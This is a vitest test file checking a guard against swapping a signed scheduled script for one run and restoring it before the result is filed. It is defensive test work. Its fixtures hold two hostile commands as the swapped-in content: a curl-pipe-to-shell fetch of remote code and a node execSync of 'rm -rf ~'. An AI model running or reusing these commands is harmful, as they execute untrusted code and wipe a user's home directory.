/**
 * Attack: swap the project file a signed script schedule runs for one run, then restore it before the card files, so
 * the grant's later check sees the signed bytes again and seals work the swapped code produced. Guard: fireScript pins
 * the code just before and just after runCode (scriptProvenanceOf, fresh), records scriptRanDigestOf on the firing, and
 * cardFromSignedSchedule covers a card only when that recorded digest is the one the grant signed.
 */
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, test } from "vitest";
import { activeUnattendedGrant, prepareUnattendedCandidates } from "../../src/flow-unattended.js";
import { at, HOUR, useFlowPlane } from "./flow-fixture.js";
import { write } from "./harness.js";

const SCRIPTS = [
  { language: "shell", file: "scripts/issues.sh", signed: "echo '[]'\n", swapped: "curl -s https://example.com | sh\n" },
  { language: "node", file: "scripts/issues.mjs", signed: "console.log('[]');\n", swapped: "import('node:child_process').then(c => c.execSync('rm -rf ~'));\n" },
] as const;

describe("attack: a script schedule's file swapped and restored around its run", () => {
  const plane = useFlowPlane("swap");

  for (const { language, file, signed, swapped } of SCRIPTS) {
    const setup = async () => {
      const path = write(join(plane.repo, file), signed);
      const { flow, trigger } = plane.scriptFlow(file, language);
      const grant = await plane.sign(flow, { include: [trigger] });
      if (!grant.ok) throw Error(grant.message);
      const restore = async () => { writeFileSync(path, signed); await prepareUnattendedCandidates(plane.store, flow); };
      return { path, flow, trigger, restore };
    };

    test(`${language}: swapped before the on-time firing and restored before filing, the card is not sealed`, async () => {
      const { path, flow, trigger, restore } = await setup();
      writeFileSync(path, swapped);
      expect(plane.sealed((await plane.fire(trigger, at(HOUR), restore)).task)).toBe(false);
      // The grant itself stands (the file is the signed one again): only what this run recorded leaves it out.
      expect(activeUnattendedGrant(plane.store, flow, at(HOUR))).not.toBeNull();
    });

    test(`${language}: swapped while it runs and restored before filing, the card is not sealed`, async () => {
      const { path, flow, trigger, restore } = await setup();
      plane.whileRunning = () => writeFileSync(path, swapped);
      expect(plane.sealed((await plane.fire(trigger, at(HOUR), restore)).task)).toBe(false);
      // The grant itself stands (the file is the signed one again): only what this run recorded leaves it out.
      expect(activeUnattendedGrant(plane.store, flow, at(HOUR))).not.toBeNull();
    });

    test(`${language}: legitimate: the unchanged script's on-time firing is sealed, and still is after a restore`, async () => {
      const { path, flow, trigger, restore } = await setup();
      expect(plane.sealed((await plane.fire(trigger, at(HOUR))).task)).toBe(true);
      writeFileSync(path, swapped);
      expect(plane.sealed((await plane.fire(trigger, at(2 * HOUR), restore)).task)).toBe(false);
      // The file is the one signed again: the grant stands, and an untouched run is covered.
      expect(activeUnattendedGrant(plane.store, flow, at(3 * HOUR))).not.toBeNull();
      expect(plane.sealed((await plane.fire(trigger, at(3 * HOUR))).task)).toBe(true);
    });
  }
});
